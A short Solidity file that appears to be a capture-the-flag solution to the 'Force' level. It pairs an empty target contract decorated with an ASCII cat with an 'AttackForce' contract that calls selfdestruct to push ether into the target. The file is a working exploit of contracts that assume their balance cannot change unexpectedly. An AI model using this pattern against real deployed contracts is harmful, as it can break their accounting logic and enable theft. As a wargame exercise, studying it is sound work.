// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


contract AttackForce {

 
  address payable force;

  constructor(address payable _force) payable {
    force = _force;
  }
    receive() external payable {

    }
  function attack() public {
      selfdestruct(force);
  }
}